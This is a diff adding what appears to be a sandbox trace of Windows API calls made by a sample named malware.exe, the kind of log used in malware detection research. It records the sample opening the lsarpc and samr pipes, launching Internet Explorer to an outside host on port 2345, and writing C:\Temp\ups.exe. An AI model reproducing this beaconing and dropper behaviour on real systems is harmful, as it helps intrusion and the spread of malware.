@@ -1,0 +1,165 @@
+3172 malware.exe
+#239120000
+LoadLibrary
+lpFileName=Advapi32.dll
+Return=SUCCESS
+#239160000
+LoadLibrary
+lpFileName=ntdll.dll
+Return=SUCCESS
+#239180000
+LoadLibrary
+lpFileName=ntdll.dll
+Return=SUCCESS
+#239200000
+LoadLibrary
+lpFileName=ntdll.dll
+Return=SUCCESS
+#239240000
+RegQueryValue
+hKey=HKEY_LOCAL_MACHINE\Software\Microsoft\Rpc\MaxRpcSize
+Return=2
+#239350000
+LoadLibrary
+lpFileName=rpcrt4.dll
+Return=SUCCESS
+#239550000
+CreateFile
+hName=\\.\PIPE\lsarpc
+desiredAccess=GENERIC_READ GENERIC_WRITE 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#239680000
+LoadLibrary
+lpFileName=Advapi32.dll
+Return=SUCCESS
+#241500000
+CreateFile
+hName=C:\Program
+desiredAccess=GENERIC_READ 
+creationDisposition=OPEN_EXISTING
+Return=FAILURE
+#241530000
+CreateFile
+hName=C:\Program Files\Internet
+desiredAccess=GENERIC_READ 
+creationDisposition=OPEN_EXISTING
+Return=FAILURE
+#242880000
+LoadLibrary
+lpFileName=VERSION.dll
+Return=SUCCESS
+#243030000
+CreateFile
+hName=C:\Program Files\Internet Explorer\IEXPLORE.EXE
+desiredAccess=GENERIC_READ 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#243120000
+CreateFile
+hName=C:\Program Files\Internet Explorer\IEXPLORE.EXE
+desiredAccess=GENERIC_READ 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#244590000
+RegQueryValue
+hKey=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache
+Return=0
+#244630000
+LoadLibrary
+lpFileName=advapi32.dll
+Return=SUCCESS
+#241470000
+CreateProcessInternal
+lpCommandLine=C:\Program Files\Internet Explorer\iexplore.exe http://xytets.com:2345/t.asp?os=home
+Return=SUCCESS
+dwProcessId=3192
+dwThreadId=3196
+#241470000
+CreateProcessInternal
+lpCommandLine=C:\Program Files\Internet Explorer\iexplore.exe http://xytets.com:2345/t.asp?os=home
+Return=SUCCESS
+dwProcessId=3192
+dwThreadId=3196
+#241470000
+WinExec
+lpCmdLine=C:\Program Files\Internet Explorer\iexplore.exe http://xytets.com:2345/t.asp?os=home
+Return=SUCCESS
+#245560000
+LoadLibrary
+lpFileName=C:\WINDOWS\system32\IMM32.DLL
+Return=SUCCESS
+#246920000
+LoadLibrary
+lpFileName=gdi32.dll
+Return=SUCCESS
+#246280000
+LoadLibrary
+lpFileName=LPK.DLL
+Return=SUCCESS
+#247340000
+CreateFile
+hName=\\.\PIPE\samr
+desiredAccess=GENERIC_READ GENERIC_WRITE 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#248600000
+CreateFile
+hName=\\.\PIPE\lsarpc
+desiredAccess=GENERIC_READ GENERIC_WRITE 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#248780000
+CreateFile
+hName=\\.\PIPE\samr
+desiredAccess=GENERIC_READ GENERIC_WRITE 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#249110000
+LoadLibrary
+lpFileName=user32.dll
+Return=SUCCESS
+#249590000
+CreateFile
+hName=\\.\PIPE\lsarpc
+desiredAccess=GENERIC_READ GENERIC_WRITE 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#250800000
+CreateFile
+hName=\\.\PIPE\lsarpc
+desiredAccess=GENERIC_READ GENERIC_WRITE 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#276130000
+CreateFile
+hName=C:\Documents and Settings\All Users\Desktop\malware.exe
+desiredAccess=GENERIC_READ 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#276600000
+CreateFile
+hName=C:\Temp\ups.exe
+desiredAccess=GENERIC_WRITE 
+creationDisposition=CREATE_ALWAYS
+Return=SUCCESS
+#277650000
+CreateFile
+hName=\\.\PIPE\lsarpc
+desiredAccess=GENERIC_READ GENERIC_WRITE 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#279310000
+CreateFile
+hName=\\.\PIPE\lsarpc
+desiredAccess=GENERIC_READ GENERIC_WRITE 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#461230000
+CreateFile
+hName=\\.\PIPE\samr
+desiredAccess=GENERIC_READ GENERIC_WRITE 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#461610000
+ExitProcess
